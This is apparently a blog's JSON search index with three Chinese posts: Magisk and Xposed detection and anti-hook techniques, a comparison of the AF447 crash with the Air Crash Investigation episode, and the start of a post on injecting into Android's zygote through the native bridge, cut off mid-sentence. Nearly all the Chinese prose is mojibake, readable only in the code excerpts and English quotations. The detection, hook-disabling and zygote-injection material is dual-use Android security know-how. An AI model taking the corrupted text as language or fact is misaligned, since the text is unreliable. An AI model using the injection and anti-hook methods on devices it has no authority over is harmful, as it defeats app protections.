relabeltoï¼Œåˆ™appå¯èƒ½æŠŠæŸä¸ªæ–‡ä»¶çš„contextç»™chconæˆmagisk_fileï¼Œç„¶åé€šè¿‡å°è¯•æ“ä½œè¿™ä¸ªæ–‡ä»¶åˆ¤æ–­æœ‰æ²¡æœ‰è¢«æ‹’ç»å°±å¯ä»¥æµ‹è¯•å‡ºç³»ç»Ÿä¸­æœ‰æ²¡æœ‰è¿™ä¸ªdomainã€‚SELinuxæ˜¯Androidå®‰å…¨æœºåˆ¶ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå¼ºçƒˆåå¯¹å°†å…¶è®¾ç½®ä¸ºå®½å®¹æ¨¡å¼æˆ–å¿½ç•¥neverallowéšæ„æ·»åŠ è§„åˆ™ã€‚é¢˜å¤–è¯ï¼šæ£€æµ‹ magiskdè™½ç„¶ MagiskDetector æ²¡æœ‰ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œä½†è§‰å¾—æœ‰ç‚¹æ„æ€ï¼Œå¯ä»¥æ‹¿å‡ºæ¥è®²ä¸€è®²ã€‚Android 7ä¹‹å‰ï¼Œ/procæ²¡æœ‰é™åˆ¶ï¼Œä»»ä½•äººéƒ½èƒ½éå†è·å¾—è¿›ç¨‹åˆ—è¡¨ï¼›åœ¨7çš„æ—¶å€™ï¼ŒåŠ äº†hidepid=2ï¼Œä½†å¹¶ä¸æ˜¯æ‰€æœ‰å‚å•†éƒ½è·Ÿä¸Šäº†ï¼›å¯¹äºè¿™äº›è®¾å¤‡ï¼Œæ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä¸ªå«magiskdçš„è¿›ç¨‹å°±èƒ½ç¡®å®šæœ‰æ²¡æœ‰magiskã€‚Xposedæ£€æµ‹ XposedåŸç‰ˆ Xposed æ¡†æ¶å°†è‡ªå·±çš„ç±»åŠ å…¥åˆ°bootclasspathä¸­ï¼Œè¿™å¯¼è‡´ä»»ä½•äººéƒ½èƒ½è½»æ˜“æ‰¾åˆ°ã€‚ä¹‹åï¼Œå¤§å®¶éƒ½é€‰æ‹©æŠŠ classloader éš”ç¦»å¼€æ¥ï¼Œè®©æ£€æµ‹æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ï¼›ä½†æ˜¯ï¼Œåªè¦å®ƒå­˜åœ¨äºå†…å­˜ä¸­ï¼Œé‚£å°±å¯ä»¥è¢«æ‰¾åˆ°ã€‚XposedDetectorçš„åŸç†å¾ˆç®€å•ï¼Œé€šè¿‡artçš„ä¸€ä¸ªå†…éƒ¨æ¥å£ï¼ˆVisitRootsï¼‰ï¼Œæ‰¾åˆ°å †é‡Œçš„æ‰€æœ‰ClassLoaderï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªå°è¯•ã€‚ç›®å‰lspã€edxpã€æ¢¦å¢ƒç­‰éƒ½é€‰æ‹©åªåœ¨ç›®æ ‡åº”ç”¨åŠ è½½ï¼Œä»¥é˜»æ­¢è¯¯ä¼¤ã€‚æŠŠè¿™ä¸ªå‡½æ•°hookäº†å½“ç„¶å¯ä»¥ï¼Œä½†æˆ‘ä»¬å¹¶ä¸æƒ³ç©è¿™ç§çŒ«é¼ æ¸¸æˆï¼Œåªèƒ½ä¿è¯éç›®æ ‡åº”ç”¨çš„ç¯å¢ƒä¸è¢«ä¿®æ”¹ã€‚å Xposed HookXposedDetectorçš„åšæ³•æ˜¯ï¼Œé€šè¿‡ä¸Šé¢çš„æ–¹æ³•ï¼Œå¯ä»¥æ‰¾åˆ°å½“å‰è¿›ç¨‹é‡Œçš„æ‰€æœ‰ç±»ï¼Œä¾æ®æ­¤æ³•æ‰¾åˆ° XposedBridge æŠŠ disableHooks å’Œ sHookedMethodCallbacks æ”¹æ‰å°±å¯ä»¥ã€‚å®é™…ä¸Šï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–æ–¹æ³•ï¼šé™¤äº†åŸç‰ˆxposedå’Œ0.5ä¹‹å‰çš„edxposedï¼Œå…¶ä»–æ¡†æ¶åŸºæœ¬éƒ½ç›´æ¥å¿½ç•¥éš”ç¦»è¿›ç¨‹ï¼Œå¯ä»¥æŠŠé‡è¦çš„ä¸œè¥¿æ”¾åœ¨éš”ç¦»è¿›ç¨‹ã€‚é€šè¿‡ Xposed hook ä¸€ä¸ªæ–¹æ³•ï¼Œæœ€ç»ˆéƒ½ä¼šèµ°åˆ°è¿™ä¸ªæ–¹æ³•ï¼š123456public static XC_MethodHook.Unhook hookMethod(Member hookMethod, XC_MethodHook callback) &#123; // ... else if (hookMethod.getDeclaringClass().isInterface()) &#123; throw new IllegalArgumentException(\"Cannot hook interfaces: \" + hookMethod.toString()); &#125;&#125;è¿™æ®µæ£€æŸ¥åœ¨Android 7ä¹‹åæ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºAndroid 7æ”¯æŒäº†ä¸€ä¸ªJava 8ç‰¹æ€§ï¼Œå«åšinterface default methodã€‚interfaceä¸å†åªèƒ½â€œè¯´ç©ºè¯â€ï¼Œè€Œä¹Ÿèƒ½æœ‰è‡ªå·±çš„æ–¹æ³•ä½“ï¼Œè€Œå®ç°ç±»åªè¦ä¸é‡å†™ï¼Œè¯¥æ–¹æ³•çš„declaring classå°±æ˜¯interfaceï¼ŒXposedè¿›è¡Œhookæ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚Xposedå’Œå„è·¯å®ç°åŸºæœ¬åŸç†éƒ½æ˜¯å¯¹entry_point_from_quick_compiled_code_è¿™ä¸ªæˆå‘˜åŠ¨æ‰‹è„šï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹è¿™ä¸ªæˆå‘˜ä¹Ÿå¯ä»¥inline hookï¼›è€Œåœ¨artä¸­æœ‰ä¸€ä¸ªâ€œä¸‡èƒ½å…¥å£â€ï¼šè§£é‡Šæ‰§è¡Œå…¥å£ï¼Œé€šè¿‡è®¾ç½®æ–¹æ³•å…¥å£ä¸ºè§£é‡Šæ‰§è¡Œå¯ä»¥ä½¿å¾— Xposed hook å¤±æ•ˆï¼Œä½†å¯¹ Frida è¿™ç§ä¿®æ”¹äº†è§£é‡Šå™¨çš„æ— æ•ˆã€‚","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"magisk","slug":"magisk","permalink":"https://blog.canyie.top/tags/magisk/"},{"name":"xposed","slug":"xposed","permalink":"https://blog.canyie.top/tags/xposed/"}]},{"title":"ã€Šç©ºä¸­æµ©åŠ«ã€‹é‡Œçš„æ³•èˆª447","slug":"af447-in-aci","date":"2020-08-20T03:08:17.000Z","updated":"2025-04-24T10:33:02.812Z","comments":true,"path":"2020/08/20/af447-in-aci/","link":"","permalink":"https://blog.canyie.top/2020/08/20/af447-in-aci/","excerpt":"2009å¹´6æœˆ1æ—¥ï¼ˆUTCæ—¶é—´ï¼‰ï¼Œæ³•å›½èˆªç©º447å·ç­æœºï¼ˆæœºå‹ç©ºä¸­å®¢è½¦A330-203ã€æ³¨å†Œå·F-GZCPï¼‰åœ¨å¤§è¥¿æ´‹ä¸­éƒ¨é›·è¾¾ç›²åŒºç¥ç§˜å¤±è¸ªï¼Œåè¢«è¯å®å æ¯ï¼Œæœºä¸Š228äººï¼ˆä¹˜å®¢216äººã€æœºç»„æˆå‘˜12äººï¼‰å…¨æ•°ç½¹éš¾ã€‚è‘—åç©ºéš¾æ–‡çŒ®å‰§ã€ŠAir Crash Investigationã€‹ï¼ˆä¸­æ–‡ä¸€èˆ¬è¯‘ä¸ºã€Šç©ºä¸­æµ©åŠ«ã€‹ï¼Œä»¥ä¸‹ç®€ç§°ACIï¼‰åœ¨S12E13ä¸­æ”¶å½•äº†æ­¤äº‹æ•…ï¼Œæ­éœ²äº†æ‰€è°“çš„â€œç©ºéš¾çœŸç›¸â€ï¼Œå°†çŸ›å¤´ç›´æŒ‡å‰¯é©¾é©¶çš®åŸƒå°”-å¡å¾·é‡Œå…‹Â·åšå—ï¼ˆPierre CÃ©dric Boninï¼‰ï¼›åŒæ—¶ï¼Œç”±äºè¯¥ç‰‡çš„çŸ¥ååº¦ï¼Œè®©è®¸å¤šèˆªç©ºçˆ±å¥½è€…ä¹ƒè‡³çœŸæ­£çš„èˆªç©ºä»ä¸šè€…è®¤ä¸ºè¯¥ç‰‡æ‰€è¿°å³ä¸ºäº‹å®ã€‚ç„¶è€Œï¼ŒçœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿ","text":"2009å¹´6æœˆ1æ—¥ï¼ˆUTCæ—¶é—´ï¼‰ï¼Œæ³•å›½èˆªç©º447å·ç­æœºï¼ˆæœºå‹ç©ºä¸­å®¢è½¦A330-203ã€æ³¨å†Œå·F-GZCPï¼‰åœ¨å¤§è¥¿æ´‹ä¸­éƒ¨é›·è¾¾ç›²åŒºç¥ç§˜å¤±è¸ªï¼Œåè¢«è¯å®å æ¯ï¼Œæœºä¸Š228äººï¼ˆä¹˜å®¢216äººã€æœºç»„æˆå‘˜12äººï¼‰å…¨æ•°ç½¹éš¾ã€‚è‘—åç©ºéš¾æ–‡çŒ®å‰§ã€ŠAir Crash Investigationã€‹ï¼ˆä¸­æ–‡ä¸€èˆ¬è¯‘ä¸ºã€Šç©ºä¸­æµ©åŠ«ã€‹ï¼Œä»¥ä¸‹ç®€ç§°ACIï¼‰åœ¨S12E13ä¸­æ”¶å½•äº†æ­¤äº‹æ•…ï¼Œæ­éœ²äº†æ‰€è°“çš„â€œç©ºéš¾çœŸç›¸â€ï¼Œå°†çŸ›å¤´ç›´æŒ‡å‰¯é©¾é©¶çš®åŸƒå°”-å¡å¾·é‡Œå…‹Â·åšå—ï¼ˆPierre CÃ©dric Boninï¼‰ï¼›åŒæ—¶ï¼Œç”±äºè¯¥ç‰‡çš„çŸ¥ååº¦ï¼Œè®©è®¸å¤šèˆªç©ºçˆ±å¥½è€…ä¹ƒè‡³çœŸæ­£çš„èˆªç©ºä»ä¸šè€…è®¤ä¸ºè¯¥ç‰‡æ‰€è¿°å³ä¸ºäº‹å®ã€‚ç„¶è€Œï¼ŒçœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿï¼ˆæ³¨ï¼šæœ¬æ–‡ä¸»è¦å†…å®¹å°†å¯¹æ¯”ã€Šç©ºä¸­æµ©åŠ«ã€‹ä¸­æ‰€è¿°ä¸äº‹å®è¿›è¡Œå¯¹æ¯”ï¼Œä¸ç»§ç»­æ·±å…¥æ¢è®¨é£æœºå¤±äº‹çš„æ·±å±‚åŸå› ï¼›æœ¬æ–‡å†…å®¹åŸºäºå®˜æ–¹è°ƒæŸ¥æŠ¥å‘ŠåŠå®˜æ–¹é»‘åŒ£å­æ•°æ®ï¼›å¦‚æ— ç‰¹åˆ«è¯´æ˜ï¼Œæœ¬æ–‡æ‰€æœ‰æ—¶é—´éƒ½é‡‡ç”¨UTCæ—¶é—´ï¼‰ã€‚åœ¨ç©ºéš¾å‘ç”Ÿå‰å‡ åˆ†é’Ÿï¼Œå†°æ™¶å µå¡äº†çš®æ‰˜ç®¡ï¼Œå¯¼è‡´ç©ºé€Ÿè¯»æ•°ä¸ä¸€è‡´ï¼Œé£æœºçš„è‡ªåŠ¨é©¾é©¶ä»ªç«‹åˆ»æ–­å¼€ï¼ŒåŒæ—¶ä¿æŠ¤æ³•åˆ™åˆ‡æ¢è‡³å¤‡ç”¨ã€‚æ­¤æ—¶åšå—æ¥æ‰‹æ§åˆ¶å¹¶å¼€å§‹æ‹‰æ†ã€‚æ¥ä¸‹æ¥ï¼Œè¯¥ç‰‡ä¸­è¡¨ç¤ºâ€œå³ä½¿å¦ä¸€åé£è¡Œå‘˜ç½—ä¼¯ç‰¹å‘Šè¯‰åšå—éœ€è¦æ¨æ†ï¼Œåšå—ä»ç„¶ä¸€ç›´åœ¨æ‹‰æ†â€ï¼›ç„¶è€Œï¼ŒFDRæ•°æ®æ˜¾ç¤ºåšå—å¬ä»äº†ç½—ä¼¯ç‰¹çš„å»ºè®®ï¼Œå¼€å§‹æ¨æ†(æ¨¡æ‹ŸåŠ¨ç”»ä¸­å¯ä»¥å¾ˆæ˜æ˜¾çœ‹è§å³åº§ä¾§æ†åœ¨â€œnose downâ€ä½ï¼‰ã€‚åŒæ—¶ï¼ŒECAMä¸Šæ˜¾ç¤ºäº†æœ€å¤§é€Ÿåº¦ï¼Œè°ƒæŸ¥æŠ¥å‘Šä¸­è¡¨ç¤ºè¿™å¯èƒ½ä½¿æœºç»„æ›´æ‹…å¿ƒé£æœºè¶…é€Ÿè€Œéå¤±é€Ÿï¼Œç„¶è€Œè¯¥ç»†èŠ‚æ²¡æœ‰å±•ç¤ºåœ¨è¯¥ç‰‡ä¸­ã€‚æ¥ä¸‹æ¥åšå—å› ä¸ºå¯¹å½“å‰æƒ…å†µçš„å›°æƒ‘å†æ¬¡å¼€å§‹æ‹‰æ†ã€‚æ­¤æ—¶ï¼Œé£æœºé™·å…¥å¤±é€Ÿå¼€å§‹å è½ï¼Œè¯¥ç‰‡ä¸­è¡¨ç¤ºâ€œç½—ä¼¯ç‰¹æ¥æ‰‹æ§åˆ¶ï¼Œä»–å¼€å§‹æ¨æ†ä»¥æ”¹å‡ºå¤±é€Ÿï¼Œä½†åšå—ä»åœ¨æ‹‰æ†ï¼Œä»–ä»¬çš„è¾“å…¥å®Œå…¨ç›¸åå¯¼è‡´äº’ç›¸æŠµæ¶ˆäº†â€ï¼›è€Œç°å®æ˜¯ï¼Œç½—ä¼¯ç‰¹çš„ç¡®å°è¯•æ¥æ‰‹ï¼Œä½†æ˜¯ä»–åªæ˜¯å‘å·¦æ‰³äº†ä¸¤ä¸‹ä¾§æ†ï¼Œç„¶åæ§åˆ¶æƒå°±åˆè¢«åšå—æŠ¢èµ°äº†ã€‚è°ƒæŸ¥æŠ¥å‘ŠåŸæ–‡å¦‚ä¸‹ï¼šAt 2 h 11 min 37, the PNF said â€œcontrols to the leftâ€, took over priority without any callout and continued to handle the aeroplane. The PF almost immediately took back priority without any callout and continued piloting.æ­¤æ—¶ï¼Œç”±äºç©ºé€Ÿè¿‡ä½ï¼ˆä¸‰æ ¹çš®æ‰˜ç®¡æµ‹å‡ºçš„ç©ºé€Ÿæ•°æ®éƒ½å°äº60 ktï¼‰ï¼Œé£æœºè®¤ä¸ºè¿™æ˜¯ç”µè„‘å‡ºäº†æ•…éšœè€ŒæŠ‘åˆ¶äº†å¤±é€Ÿè­¦å‘Šï¼Œéšåé£è¡Œå‘˜æ›¾å¤šæ¬¡å°è¯•æ¨æ†é™ä½æ”»è§’ï¼Œè¿™ä½¿å¾—ç©ºé€Ÿå›å‡ï¼Œè™½ç„¶è¿˜æ˜¯å¤±é€Ÿä½†ç”µè„‘è®¤ä¸ºè¿™ä¸ªå€¼æ˜¯æœ‰æ•ˆçš„ï¼Œå†æ¬¡è§¦å‘äº†å¤±é€Ÿè­¦å‘Šï¼Œè¿™ä½¿å¾—é£è¡Œå‘˜æ›´åŠ å›°æƒ‘ï¼›è€Œå¦‚æ­¤é‡è¦çš„ä¿¡æ¯ACIé‡Œç«Ÿç„¶ä¸€å¥éƒ½æ²¡æã€‚è°ƒæŸ¥æŠ¥å‘ŠåŸæ–‡ï¼šAt around 2 h 11 min 42, the Captain re-entered the cockpit. During the following seconds, all of the recorded speeds became invalid and the stall warning stopped, after having sounded continuously for 54 seconds.At 2 h 12 min 02, the PF said, â€œI have no more displaysâ€, and the PNF â€œwe have no valid indicationsâ€. At that moment, the thrust levers were in the IDLE detent and the enginesâ€™ N1â€™s were at 55%. Around fifteen seconds later, the PF made pitch-down inputs. In the following moments, the angle of attack decreased, the speeds became valid again and the stall warning triggered again.If the CAS measurements for the three ADR are lower than 60 kt, the angle of attack values of the three ADR are invalid and the stall warning is then inoperative. This results from a logic stating that the airflow must be sufficient to ensure a valid measurement by the angle of attack sensors, especially to prevent spurious warnings.åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé£è¡Œå‘˜ä¸ä¼šç›¸ä¿¡å¤±é€Ÿè­¦å‘Šå› ä¸ºå®ƒè¡¨ç°å¾—å’Œä»¥å‰ä»–ä»¬æ‰€å­¦åˆ°çš„å†…å®¹å®Œå…¨ç›¸åï¼›é£è¡Œå‘˜ä¼šæœ¬èƒ½åœ°æ‹‰ç€æ†è®©å¤±é€Ÿè­¦å‘Šåœæ­¢ï¼Œæ®Šä¸çŸ¥è¿™æ ·ä¼šè®©æƒ…å†µæ›´åŠ æ¶åŒ–ã€‚é£æœºå°±è¿™æ ·å› ä¸ºå¤±é€Ÿä¸æ–­ä¸‹å ï¼Œåˆ°äº†8000 ftï¼Œè¿™ä¸ªæ—¶å€™æ‰å‘ç”Ÿæ˜ç¡®çš„ä¿¯ä»°æŒ‡ä»¤å†²çªï¼Œä¸”FDRæ•°æ®ä¸­æœ‰éå¸¸æ˜ç¡®çš„â€œDUAL INPUTâ€è­¦å‘Šï¼Œéšååšå—ç«‹åˆ»æ”¾å¼€äº†æ‰‹ï¼Œå¹¶éè¯¥ç‰‡ä¸­æ‰€è¯´çš„â€œä¸¤ä½é£è¡Œå‘˜è¾“å…¥ç›¸åï¼Œå¯¼è‡´åœ¨æ²¡æœ‰è­¦å‘Šçš„æƒ…å†µä¸‹ç›¸äº’æŠµæ¶ˆâ€ï¼›éšåä¸¤ä½é£è¡Œå‘˜éƒ½å¼€å§‹æ‹‰æ†ï¼›æ­¤æ—¶é«˜åº¦è¿‡ä½å·²æ— åŠ›å›å¤©ï¼Œé£æœºå å…¥äº†å†°å†·çš„å¤§è¥¿æ´‹ï¼Œæœºä¸Š228äººå…¨éƒ¨ç½¹éš¾ï¼ŒR.I.P.å¦é™„ä¸€äº›æœ‰è¶£çš„ç»†èŠ‚ï¼šå¯¹å…¶ä»–æœºç»„è¿›è¡Œç±»ä¼¼çŠ¶å†µæ¨¡æ‹Ÿï¼Œæœ‰å¤šä¸ªæœºç»„æœªèƒ½æ­£ç¡®è®¤è¯†å½“å‰çŠ¶æ€ï¼ˆè§è°ƒæŸ¥æŠ¥å‘Š 1.16.2 åŠ 1.16.8.4ï¼‰ã€‚æ®‹éª¸è¡¨æ˜å·¦åº§ä½åœ¨ç©ºéš¾å‘ç”Ÿæ—¶åœ¨æ”¶å›ä½ï¼ˆè§è°ƒæŸ¥æŠ¥å‘Š 1.16.9ï¼‰ã€‚2006å¹´5æœˆ3æ—¥ï¼Œäºšç¾å°¼äºšèˆªç©º967å·ç­æœºåœ¨ç´¢å¥‘å›½é™…æœºåœºé™„è¿‘å æµ·ï¼Œæœ€ç»ˆè°ƒæŸ¥æŠ¥å‘Šä¸­æåˆ°åœ¨é£è¡Œçš„æœ€åæ—¶åˆ»ï¼Œä¸¤ä½é£è¡Œå‘˜å¯¹ä¾§æ†åšå‡ºäº†ç›¸åçš„è¾“å…¥ï¼Œä¸”â€œDUAL INPUTâ€è­¦å‘Šå› ä¸ºä¼˜å…ˆçº§ä½äºè¿‘åœ°è­¦å‘Šè€Œè¢«æŠ‘åˆ¶ã€‚æ³•èˆªA330â€œç©ºé€Ÿä¸å¯é â€æ“ä½œæ‰‹å†Œï¼šè‡³æ­¤ï¼Œç›¸ä¿¡å¤§å®¶éƒ½äº†è§£äº†æŸæ–‡çŒ®å‰§æ˜¯ä»€ä¹ˆæ ·çš„ã€‚å¦é™„è¥é”€å·ç¬‘è¯ä¸€åˆ™ï¼ˆçº¯å¨±ä¹ï¼Œæ— æ¶æ„ï¼‰ï¼šé£æœºæ˜¯æ€ä¹ˆé£èµ·æ¥çš„å‘¢ï¼Ÿé£æœºç›¸ä¿¡å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰ï¼Œä½†æ˜¯é£æœºæ˜¯æ€ä¹ˆé£èµ·æ¥çš„å‘¢ï¼Œä¸‹é¢å°±è®©å°ç¼–å¸¦å¤§å®¶ä¸€èµ·äº†è§£å§ã€‚é£æœºèƒ½é£èµ·æ¥ï¼Œå…¶å®é çš„å°±æ˜¯å¼•æ“ï¼Œè€Œå¼•æ“æ˜¯æ€ä¹ˆå·¥ä½œçš„å‘¢ï¼Œå…¶å®å’Œæˆ‘ä»¬å°æ—¶å€™ç©çš„æ‘‡æ‘‡è½¦æ˜¯ä¸€æ ·åŸç†ï¼ŒæŠ•å¸å°±èƒ½å·¥ä½œï¼Œå¤§å®¶å¯èƒ½ä¼šå¾ˆæƒŠè®¶é£æœºæ€ä¹ˆä¼šé å¼•æ“é£èµ·æ¥å‘¢ï¼Ÿä½†äº‹å®å°±æ˜¯è¿™æ ·ï¼Œå°ç¼–ä¹Ÿæ„Ÿåˆ°éå¸¸æƒŠè®¶ã€‚è¿™å°±æ˜¯å…³äºé£æœºèƒ½é£èµ·æ¥çš„äº‹æƒ…äº†ï¼Œå¤§å®¶æœ‰ä»€ä¹ˆæƒ³æ³•å‘¢ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºå‘Šè¯‰å°ç¼–ä¸€èµ·è®¨è®ºå“¦ï¼å¤–éƒ¨å¼•ç”¨ï¼šBEAå‘å¸ƒçš„æ³•èˆª447ç©ºéš¾æœ€ç»ˆè°ƒæŸ¥æŠ¥å‘Šï¼ˆè‹±æ–‡ç‰ˆï¼‰BEAå‘å¸ƒçš„æ³•èˆª447 FDRåŠ¨ç”»ï¼ˆä¸­æ–‡ç¿»è¯‘ç‰ˆï¼‰ã€Šç©ºä¸­æµ©åŠ«ã€‹S12E13ï¼šæ³•å›½èˆªç©º447å·ç­æœº","categories":[],"tags":[{"name":"èˆªç©º","slug":"èˆªç©º","permalink":"https://blog.canyie.top/tags/%E8%88%AA%E7%A9%BA/"}]},{"title":"é€šè¿‡ç³»ç»Ÿçš„native bridgeå®ç°æ³¨å…¥zygote","slug":"nbinjection","date":"2020-08-18T12:17:23.000Z","updated":"2025-04-24T10:33:02.823Z","comments":true,"path":"2020/08/18/nbinjection/","link":"","permalink":"https://blog.canyie.top/2020/08/18/nbinjection/","excerpt":"ä¹‹å‰ç ”ç©¶artçš„æ—¶å€™å‘ç°äº†native bridgeï¼Œç®€å•æ¥è¯´è¿™ä¸œè¥¿æ˜¯ä¸»è¦ä½œç”¨å°±æ˜¯ä¸ºäº†èƒ½è¿è¡Œä¸åŒæŒ‡ä»¤é›†çš„soï¼ˆæ¯”å¦‚x86çš„è®¾å¤‡è¿è¡Œarmçš„appï¼‰ï¼Œè€Œarmè®¾å¤‡ä¸Šè¿™ä¸ªä¸œè¥¿ä¸€èˆ¬éƒ½æ˜¯å…³é—­çš„ï¼Œç ”ç©¶äº†ä¸€ä¸‹åå‘ç°è¿™ä¸œè¥¿æŒºé€‚åˆåŠ¨æ‰‹è„šçš„ï¼Œåˆšå¥½è‡ªå·±åœ¨ç”¨çš„Riruè¢«é’ˆå¯¹äº†ï¼Œæ‰€ä»¥æœ‰äº†è¿™ç¯‡åšå®¢ã€‚æŠŠå¯¹åº”çš„ç¤ºä¾‹ä»£ç ä¼ åˆ°äº†githubï¼šNbInjectionï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬èŠä¸€ä¸‹è¿™ä¸ªå°ç©å…·ã€‚","text":"ä¹‹å‰ç ”ç©¶artçš„æ—¶å€™å‘ç°äº†native bridgeï¼Œç®€å•æ¥è¯´è¿™ä¸œè¥¿æ˜¯ä¸»è¦ä½œç”¨å°±æ˜¯ä¸ºäº†èƒ½è¿è¡Œä¸åŒæŒ‡ä»¤é›†çš„soï¼ˆæ¯”å¦‚x86çš„è®¾å¤‡è¿è¡Œarmçš„appï¼‰ï¼Œè€Œarmè®¾å¤‡ä¸Šè¿™ä¸ªä¸œè¥¿ä¸€èˆ¬éƒ½æ˜¯å…³é—­çš„ï¼Œç ”ç©¶äº†ä¸€ä¸‹åå‘ç°è¿™ä¸œè¥¿æŒºé€‚åˆåŠ¨æ‰‹è„šçš„ï¼Œåˆšå¥½è‡ªå·±åœ¨ç”¨çš„Riruè¢«é’ˆå¯¹äº†ï¼Œæ‰€ä»¥æœ‰äº†è¿™ç¯‡åšå®¢ã€‚æŠŠå¯¹åº”çš„ç¤ºä¾‹ä»£ç ä¼ åˆ°äº†githubï¼šNbInjectionï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬èŠä¸€ä¸‹è¿™ä¸ªå°ç©å…·ã€‚æºç åˆ†æå¤§å®¶éƒ½çŸ¥é“çš„ï¼Œzygoteå¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶å°±æ˜¯app_processï¼Œå®ƒçš„mainå‡½æ•°ä»£ç å¦‚ä¸‹ï¼ˆå·²ç²¾ç®€ï¼‰ï¼š123456789101112131415161718int main(int argc, char* const argv[])&#123; AppRuntime runtime(argv[0], computeArgBlockSize(argc, argv)); // Process command line arguments // ignore argv[0] argc--; argv++; if (zygote) &#123; runtime.start(\"com.android.internal.os.ZygoteInit\", args, zygote); &#125; else if (className) &#123; runtime.start(\"com.android.internal.os.RuntimeInit\", args, zygote); &#125; else &#123; fprintf(stderr, \"Error: no class name or --zygote supplied.\\n\"); app_usage(); LOG_ALWAYS_FATAL(\"app_process: no class name or --zygote supplied.\"); &#125;&#125;AppRuntimeç»§æ‰¿è‡ªAndroidRuntimeï¼Œè€ŒAndroidRuntimeçš„ä»£ç å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š1234567891011121314151617181920212223242526272829303132/* * Start the Android runtime. This involves starting the virtual machine * and calling the \"static void main(String[] args)\" method in the class * named by \"className\". * * Passes the main function two arguments, the class name and the specified * options string. */void AndroidRuntime::start(const char* className, const Vector&lt;String8&gt;&amp; options, bool zygote)&#123; ALOGD(\"&gt;&gt;&gt;&gt;&gt;&gt; START %s uid %d &lt;&lt;&lt;&lt;&lt;&lt;\\n\", className != NULL ? className : \"(unknown)\", getuid()); /* start the virtual machine */ JniInvocation jni_invocation; jni_invocation.Init(NULL); JNIEnv* env; if (startVm(&amp;mJavaVM, &amp;env, zygote, primary_zygote) != 0) &#123; return; &#125; onVmCreated(env); /* * Register android functions. */ if (startReg(env) &lt; 0) &#123; ALOGE(\"Unable to register all android natives\\n\"); return; &#125; // ...&#125;è¿™ä¸ªå‡½æ•°åšçš„æœ€é‡è¦ä¸€ä»¶äº‹å°±æ˜¯æŠŠè™šæ‹Ÿæœºå¯åŠ¨èµ·æ¥ï¼ˆstartVmï¼‰ï¼Œç„¶åè°ƒç”¨ä¼ å…¥ç±»çš„mainæ–¹æ³•ã€‚è¿½è¸ªè¿™ä¸ªstartVmæ–¹æ³•ä½ ä¼šå‘ç°è°ƒç”¨åˆ°äº†Runtime::Initåˆå§‹åŒ–runtimeï¼Œè¿™ä¸ªå‡½æ•°å¾ˆé•¿ï¼Œæˆªå–äº†ä¸€æ®µå¯¹æˆ‘ä»¬æ¥è¯´æœ€é‡è¦çš„ï¼š1234567891011121314151617181920212223242526272829303132333435bool Runtime::Init(RuntimeArgumentMap&amp;&amp; runtime_options_in) &#123; // ... // Look for a native bridge. // // The intended flow here is, in the case of a running system: // // Runtime::Init() (zygote): // LoadNativeBridge -&gt; dlopen from cmd line parameter. // | // V // Runtime::Start() (zygote): // No-op wrt native bridge. // | // | start app // V // DidForkFromZygote(action) // action = kUnload -&gt; dlclose native bridge. // action = kInitialize -&gt; initialize library // // // The intended flow here is, in the case of a simple dalvikvm call: // // Runtime::Init(): // LoadNativeBridge -&gt; dlopen from cmd line parameter. // | // V // Runtime::Start(): // DidForkFromZygote(kInitialize) -&gt; try to initialize any native bridge given. // No-op wrt native bridge. &#123; std::string native_bridge_file_name = runtime_options.ReleaseOrDefault(Opt::NativeBridge); is_native_bridge_loaded_ = LoadNativeBridge(native_bridge_file_name); &#125; // ...&#125;åœ¨Runtime::Inité‡Œä¼šåŠ è½½native bridgeï¼ŒLoadNativeBridge()å‡½æ•°æ˜¯è¿™æ ·å®ç°çš„ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243bool LoadNativeBridge(const char* nb_library_filename, const NativeBridgeRuntimeCallbacks* runtime_cbs) &#123; // We expect only one place that calls LoadNativeBridge: Runtime::Init. At that point we are not // multi-threaded, so we do not need locking here. if (nb_library_filename == nullptr || *nb_library_filename == 0) &#123; CloseNativeBridge(false); return false; &#125; else &#123; if (!NativeBridgeNameAcceptable(nb_library_filename)) &#123; CloseNativeBridge(true); &#125; else &#123; // Try to open the library. void* handle = dlopen(nb_library_filename, RTLD_LAZY); if (handle != nullptr) &#123; callbacks = reinterpret_cast&lt;NativeBridgeCallbacks*&gt;(dlsym(handle, kNativeBridgeInterfaceSymbol)); if (callbacks != nullptr) &#123; if (isCompatibleWith(NAMESPACE_VERSION)) &#123; // Store the handle for later. native_bridge_handle = handle; &#125; else &#123; callbacks = nullptr; dlclose(handle); ALOGW(\"Unsupported native bridge interface.\"); &#125; &#125; else &#123; dlclose(handle); &#125; &#125; // Two failure conditions: could not find library (dlopen failed), or could not find native // bridge interface (dlsym failed). Both are an error and close the native bridge. if (callbacks == nullptr) &#123; CloseNativeBridge(true); &#125; else &#123; runtime_callbacks = runtime_cbs; state = NativeBridgeState::kOpened; &#125; &#125; return state == NativeBridgeState::kOpened; &#125;&#125;å‘ç°äº†ä»€ä¹ˆæ²¡æœ‰ï¼ï¼æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„dlopenï¼ï¼dlopenä¼šæ‰§è¡Œç›®æ 